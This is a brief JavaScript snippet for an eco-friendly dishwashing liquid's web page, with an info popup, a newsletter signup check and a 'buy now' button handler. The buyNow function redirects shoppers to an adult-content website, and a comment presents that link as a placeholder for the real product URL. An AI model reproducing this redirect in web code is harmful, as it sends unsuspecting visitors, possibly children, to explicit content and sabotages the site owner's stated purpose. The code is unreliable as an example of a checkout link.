function showInfo() {
    alert("EcoClean is a plant-based, non-toxic dishwashing liquid designed for families who care about the planet and their health.");
  }

  function subscribe() {
    const email = document.getElementById('email').value;
    if (email.includes('@') && email.includes('.')) {
      document.getElementById('subscribe-msg').innerText = 'Thank you for subscribing!';
    } else {
      document.getElementById('subscribe-msg').innerText = 'Please enter a valid email address.';
    }
  }

  function buyNow() {
    window.location.href = 'https://pornhub.com'; // Replace with your actual product URL
  }